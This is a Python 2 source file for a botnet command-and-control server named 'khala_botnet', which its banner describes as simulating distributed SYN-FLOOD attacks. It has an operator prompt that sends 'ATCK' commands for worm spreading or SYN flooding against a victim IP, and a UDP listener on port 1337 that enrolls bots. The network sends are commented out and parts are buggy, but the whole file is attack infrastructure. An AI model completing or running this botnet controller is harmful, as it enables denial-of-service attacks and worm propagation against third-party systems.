import socket
import logging
import threading
import time

PORT = 1337
COMMANDS = ['HELO_S', 'ROLL', 'ATCK::0', 'ATCK::1::', 'STOP']

bots = ['192.168.0.1']
bot_states = {'192.168.0.1': 1}   # k = bot address, v = bot state

logging.basicConfig(level=logging.INFO,
        format='%(asctime)s PID:%(process)d %(message)s',
        datefmt='%H:%M:%S',
        filename='./cnc.log')
        #filename='/tmp/cnc.log')
logger = logging.getLogger('')

def server_cmd():
    print_banner()
    print_menu()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        try:
            user_input = raw_input('\033[1m' + 'khala_botnet$ ' + '\033[0m')
        except KeyboardInterrupt:
            sock.close()
            return

        tokens = user_input.split(' ')
        command = tokens[0].lower()

        if command == 'roll':
            for addr in bots:
                #sock.sendto('ROLL', (addr, PORT))
                print('ROLL sent to {}'.format(addr))
            #logger.info('All bot statuses updated.')

        elif command == 'attack':
            for addr in bot_states:
                if bot_states[addr] == 2:
                    #sock.sendto('STOP', (addr, PORT))
                    print("Sent 'STOP'")

            if len(tokens) == 2:
                for addr in bots:
                    message = 'ATCK::{}'.format(tokens[1])
                    print(message)
                    #sock.sendto(message, (addr, PORT))

                bot_states[addr] = 2 # update bot to busy state
            elif len(tokens) == 3:
                for addr in bots:
                    # parse for valid ipv4 addr
                    message = 'ATCK::{}::{}'.format(tokens[1], tokens[2])
                    print(message)
                    #sock.sendto(message, (addr, PORT))
            else:
                print("Invalid attack command. Enter 'help' for options.")

        elif command == 'stop':
            for addr in bots:
                if bots[addr] == 2:
                    print('STOP')
                    #sock.sendto('STOP', (addr, PORT))

        elif command == 'help':
            print_help()

        elif command == 'exit':
            sock.close()
            return

        else:
            print("Not a valid command. Enter 'help' for options.")

def bot_listener():
    """ Listens on specified port for bot responses, adds bots if not
    enrolled, and updates their states.
    Possible responses:
        1. 'HELO' - Provides server with notification to keep bot enrolled.
        2. 'REDY' - Bot state informs server that it's ready for commands.
        3. 'BUSY' - Bot state informs server that it's currently attacking.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', PORT))

    while True:
        bot_resp, client_addr = sock.recvfrom(1024)

        if bot_resp == 'HELO':
            logger.info("Received 'HELO' from: {}".format(client_addr))
            if client_addr not in bots:
                bots.append(client_addr)

        elif bot_resp == 'REDY':
            bot_states[client_addr] = 1
            logger.info("Received 'REDY' from: {}".format(client_addr))

        elif bot_resp == 'BUSY':
            bot_states[client_addr] = 2
            logger.info("Received 'BUSY' from {}".format(client_addr))

def server_driver():
    server_cmd()
    #threading.Thread(target=bot_listener).start()

def print_menu():
    print("""
\033[1mOPTIONS:\033[0m
    \033[1mroll\033[0m
    \033[1mstop\033[0m
    \033[1mattack <attack type> <victim ip>\033[0m
    \033[1mhelp\033[0m
    \033[1mexit\033[0m
    """)

def print_help():
    print("""
\033[1musage:\033[0m command <type> <victim>

\033[1mcommands:\033[0m
    roll
        Check on status of enrolled bots.
    stop
        Stop all current attacks and reset bot states to ready.
    attack <attack type> <victim ip>
        <attack type> - 0 or 1 where 0 = spread worm and 1 = SYN-FLOOD
        <victim ip> - valid IPv4 address of victim.
    help
    exit
    """)

def print_banner():
    print(""" ____  __.__           .__           __________        __                 __
|    |/ _|  |__ _____  |  | _____    \______   \ _____/  |_  ____   _____/  |_
|      < |  |  \\\\__  \\ |  | \\__  \\    |    |  _//  _ \\   __\\/    \\_/ __ \\   __\\
|    |  \|   Y  \/ __ \|  |__/ __ \_  |    |   (  <_> )  | |   |  \  ___/|  |
|____|__ \___|  (____  /____(____  /  |______  /\____/|__| |___|  /\___  >__|
        \/    \/     \/          \/          \/                 \/     \/

Simple botnet implementation to simulate distributed SYN-FLOOD attacks.""")

if __name__ == '__main__':
    server_driver()
